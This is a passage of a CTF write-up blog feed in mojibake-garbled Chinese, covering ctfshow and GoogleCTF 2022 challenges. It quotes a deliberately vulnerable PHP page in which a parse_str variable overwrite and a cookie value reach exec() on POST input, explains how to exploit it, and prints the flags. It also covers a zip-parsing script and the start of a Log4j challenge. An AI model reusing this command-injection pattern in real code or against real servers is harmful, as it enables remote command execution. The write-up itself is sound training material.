punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token keyword">Null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Your mode is the guest!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Sucess change the ini!The logs record you!'</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token variable">$secret</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//echo var_dump($GLOBALS);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">999</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>                <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token string">"hello,the repairman!"</span><span class="token punctuation">;</span>                <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'hello,the user!We may change the mode to repaie the server,please keep it unchanged'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'refresh:5;url=index.php?mode=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ ä¸€ä¸ªsecretä¸ºMD5åçš„tokenå³å¯æ‰§è¡Œexecï¼Œä½†æ˜¯preg_replaceåªè®©ä¼ å­—æ¯æ•°å­—ã€‚</p><p>ç„¶åæ³¨æ„åˆ° ï¼Œé€šè¿‡urlä¼ å‚ç»™å˜é‡èµ‹å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æŠŠconfigå˜é‡èµ‹å€¼æˆç©ºå°±å¯ä»¥äº†ï¼Œsecretä¼ md5åçš„adminå€¼å³å¯äº«å—999å¸ç‹æƒé™ã€‚</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>execæ— å›æ˜¾ï¼Œå†™æ–‡ä»¶å³å¯ï¼Œflagè—åœ¨config.phpä¸­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225937220.png" alt="image-20221005225937220"></p><p>è®¿é—®a.txt</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'serect'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'ctfshow{4439affe-320c-4865-98ab-3650a3483fca}'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h4><p>ç¿»è½¬ï¼Œbase64è§£å¯†å³å¯ã€‚</p><h4 id="å‡¯æ’’å¯†ç "><a href="#å‡¯æ’’å¯†ç " class="headerlink" title="å‡¯æ’’å¯†ç "></a>å‡¯æ’’å¯†ç </h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    text<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'{'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'}'</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>list<span class="token punctuation">(</span>ascii_lowercase<span class="token punctuation">)</span>    table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> table<span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ctfshow{th1s_is_d1ffrent_c4esar!!}</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="ä½ newbeeå—"><a href="#ä½ newbeeå—" class="headerlink" title="ä½ newbeeå—"></a>ä½ newbeeå—</h4><p>æ‹–åˆ°IDAã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF 2022</title>
      <link href="/2022/07/12/google-ctf-2022/"/>
      <url>/2022/07/12/google-ctf-2022/</url>
      
        <content type="html"><![CDATA[<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Appnote-txt"><a href="#Appnote-txt" class="headerlink" title="Appnote.txt"></a>Appnote.txt</h4><blockquote><p>Every single archive manager unpacks this to a different file.ZIPå‹ç¼©åŒ…ç›¸å…³é¢˜ç›®ã€‚</p></blockquote><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>é¦–å…ˆç»™äº†ä¸€ä¸ªdump.zipï¼Œè§£å‹ä¹‹åå‘ç°hello.txtã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705010030.png" width=500 height=350/><p>ä½†å‹ç¼©åŒ…æœ‰60Kï¼Œåº”è¯¥ä¸æ­¢ä¸€ä¸ªtxtï¼Œå°è¯•foremoståˆ†ç¦»æ— æœã€‚å› æ­¤ä½¿ç”¨010 editoræŸ¥çœ‹æ–‡ä»¶ç»“æ„ã€‚ä¼šçœ‹åˆ°è—äº†å¾ˆå¤šä»¥504Bå¼€å¤´ä¸ºæ ‡å¿—çš„å‹ç¼©åŒ…ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705011231.png" width=600 height=400/><p>å¹¶ä¸”ä¼šçœ‹åˆ°ZIPçš„æ•°æ®åŒº(å€’æ•°ç¬¬äº”è¡Œ)æ˜¾ç¤ºflag00ï¼Œç¿»åˆ°ç»“å°¾æ˜¯flag18ï¼Œè¿™é‡ŒçŒœæµ‹flagæœ‰19ä½ã€‚å¹¶ä¸”å‘ç°åœ¨æ¯ä¸ªflagxxåç»™äº†å•ä¸ªå­—ç¬¦ï¼Œå¾ˆæ˜¾ç„¶flagæ˜¯æ ¹æ®ä½æ•°ä¸€ä¸ªä¸ªæ‹¼æ¥å¾—åˆ°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šå‹ç¼©åŒ…éƒ½å¯¹åº”flag00ï¼Œflag00ååˆæœ‰ä¸åŒçš„å­—ç¬¦ï¼Œå› æ­¤çŒœæµ‹ï¼š</p><p>â€‹<strong>å¦‚æœflag{n}{x}å¯¹åº”æ­£ç¡®çš„å‹ç¼©åŒ…ï¼Œé‚£ä¹ˆxå°±æ˜¯FLAGçš„ç¬¬nä½</strong></p><p>é—®é¢˜å°±è½¬åŒ–ä¸ºå¦‚ä½•åˆ¤æ–­çœŸçš„å‹ç¼©åŒ…ï¼Œé€šè¿‡æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œzipæ ¼å¼å‹ç¼©åŒ…ä¸»è¦ç”±ä¸‰å¤§éƒ¨åˆ†ç»„æˆï¼šæ•°æ®åŒº(0x04034b50)ã€ä¸­å¤®ç›®å½•è®°å½•åŒº(0x02014b50)ã€ä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨åŒº(0x06054b50)ã€‚å¯ä»¥å‘ç°å‡çš„å‹ç¼©åŒ…æ˜¯æ²¡æœ‰</p><p>ä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨åŒºçš„ï¼Œå› æ­¤å…¨å±€æœç´¢504B0506ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705014056.png"></p><p>æœ‰21ä¸ªç»“æœï¼Œç¬¬ä¸€ä¸ªæ˜¯hello.txtï¼Œç¬¬äºŒä¸ªæ˜¯hi.txtï¼Œå‰©ä¸‹19ä¸ªæ˜¯çœŸçš„å‹ç¼©åŒ…flag{n}ï¼Œä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨åŒºä¸»è¦ä½œç”¨æ˜¯ç”¨æ¥å®šä½ä¸­å¤®ç›®å½•è®°å½•åŒºçš„å¼€å§‹ä½ç½®çš„ã€‚å› æ­¤å†™è„šæœ¬åˆ¤æ–­å‡ºå°¾éƒ¨ï¼Œå†æ ¹æ®å°¾éƒ¨åŒºåŸŸå¯¹åº”çš„ä¸­å¤®ç›®å½•è®°å½•åŒºçš„èµ·å§‹åç§»æ‰¾åˆ°ç¬¬flagxxåçš„å­—ç¬¦å³å¯å¾—åˆ°FLAGã€‚</p><blockquote><pre class="line-numbers language-fallback"><code class="language-fallback"> ä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨åŒºç»“æ„: ä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨å¼€å¤´æ ‡è®°    4 bytes  (0x06054b50) ä¸­å¤®ç›®å½•è®°å½•å°¾éƒ¨åŒºæ‰€åœ¨ç£ç›˜ç¼–å·             2 bytes ä¸­å¤®ç›®å½•å¼€å§‹ä½ç½®æ‰€åœ¨çš„ç£ç›˜ç¼–å·  2 bytes è¯¥ç£ç›˜ä¸Šæ‰€è®°å½•çš„æ ¸å¿ƒç›®å½•æ•°é‡  2 bytes zipå‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶æ€»æ•°           2 bytes æ•´ä¸ªä¸­å¤®ç›®å½•çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰   4 bytes ä¸­å¤®ç›®å½•å¼€å§‹ä½ç½®ç›¸å¯¹ä½ç§»        4 bytes æ³¨é‡Šå†…å®¹çš„é•¿åº¦        2 bytes æ³¨é‡Šå†…å®¹       (variable size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>æ‰¾åˆ°å¼€å¤´æ ‡è®°åï¼Œå½“å‰ä½ç½®+16(å› ä¸ºä¸­å¤®ç›®å½•å¼€å§‹ä½ç½®ç›¸å¯¹ä½ç§»çš„ç›¸å¯¹ä½ç½®åœ¨16~20)ï¼Œæ‰¾åˆ°ä¸­å¤®ç›®å½•å¼€å§‹ä½ç½®çš„offsetï¼Œå†-1å³å¯æ‰¾åˆ°å­—ç¬¦(å› ä¸ºä¸­å¤®ç›®å½•å¼€å§‹ä½ç½®çš„åç§»çš„å‰ä¸€ä¸ªå­—ç¬¦å°±æ˜¯æ•°æ®åŒºä¸­çš„æ•°æ®)ã€‚</p><h5 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h5><p><code>exp</code></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"dump.zip"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> b<span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span>b<span class="token string">"PK\x05\x06"</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>       <span class="token operator">//</span><span class="token number">0x10</span>å¯¹åº”<span class="token operator">+</span><span class="token number">16</span>    flag <span class="token operator">+=</span> a<span class="token punctuation">[</span>offset<span class="token number">-1</span><span class="token punctuation">:</span>offset<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CTF{p0s7m0d3rn_z1p}</p><hr><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="LOG4J"><a href="#LOG4J" class="headerlink" title="LOG4J"></a>LOG4J</h4><blockquote><p>å…·ä½“åŸç†è¿˜æ˜¯æ²¡æœ‰å®Œå…¨ç†è§£ï¼Œå…ˆè®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹ã€‚</p></blockquote><h5 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>è®¿é—®é¶æœºï¼Œä¼šå‘ç°åªæœ‰ä¸€ä¸ªchatbotï¼Œéšä¾¿è¾“å…¥ç‚¹å‡»submitåæç¤ºéœ€è¦ä»¥&#x2F;ä¸ºå‰ç¼€ï¼Œé¢˜ç›®ç»™äº†æºç ï¼Œç›´æ¥çœ‹ä»£ç åˆ†æã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220705145853.png" width=500 height=200/><p>æ‰“å¼€æºç å¯ä»¥çœ‹åˆ°ä½¿ç”¨flaskå†™çš„è·¯ç”±ï¼Œè¿™é‡Œè´´é™„å…³é”®ä»£ç ã€‚å¯ä»¥çœ‹åˆ°å’Œchatbotäº¤äº’å®é™…ä¸Šæ˜¯é€šè¿‡è¿è¡Œjaræ¥è¿›è¡Œçš„ï¼Œçœç•¥çš„éƒ¨åˆ†å°±æ˜¯ä»¥ç©ºæ ¼åˆ†å‰²å‡ºcmdä»¥åŠtextã€‚æ¯”å¦‚è¾“å…¥ï¼šlove youã€‚æ­¤æ—¶cmdä¸ºloveï¼Œtextä¸ºyouï¼Œç„¶åè¿”å›æ ‡å‡†è¾“å‡ºã€‚è¿™é‡Œçš„cmdæ¯”è¾ƒå¯ç–‘ï¼Œæˆ‘ä»¬æ¥ç€å®¡è®¡javaéƒ¨åˆ†ã€‚</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">''</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        result <span class="token operator">=</span> chat<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># run java jar with a 10 second timeout</span>    res <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'-Dcmd='</span> <span class="token operator">+</span> cmd<span class="token punctuation">,</span> <span class="token string">'chatbot/target/app-1.0-SNAPSHOT.jar'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> text<span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>javaéƒ¨åˆ†ä»£ç å®¡ä¸‹æ¥å¤§æ¦‚å°±æ˜¯è¿™äº›åŠŸèƒ½ï¼š</p><ul><li>è¾“å…¥helpæˆ–è€…&#x2F;helpï¼Œè¿”å›æç¤ºï¼šTry some of our free commands below!  wc time repeat.</li><li>è¾“å…¥&#x2F;wc,è¿”å›0ï¼Œè¾“å…¥&#x2F;wc {str}ï¼Œè¿”å›strçš„é•¿åº¦ã€‚</li><li>è¾“å…¥&#x2F;timeï¼Œè¿”å›æ—¶é—´ã€‚</li><li>è¾“å…¥&#x2F;repeatï¼Œè¿”å›ç©ºï¼Œè¾“å…¥&#x2F;repeat {str}ï¼Œè¿”å›strã€‚</li></ul><p>è¿™é‡Œè¿˜æ˜¯æ²¡å•¥å¤´ç»ªï¼Œå› ä¸ºè¿™é¢˜æ˜¯LOG4Jï¼Œå› æ­¤ç¿»ä¸€ä¸‹xmlé…ç½®æ–‡ä»¶ï¼Œå‘ç°äº†å¯ç–‘ç‚¹ã€‚PatternLayoutæ˜¯log4jç”¨äºæŒ‡å®šè¾“å‡ºæ ¼å¼çš„çš„ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå¯ä»¥çœ‹åˆ°å®ƒæ˜¯é€šè¿‡ELè¡¨è¾¾å¼${}çš„å½¢å¼è¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œã€‚</p><p><img 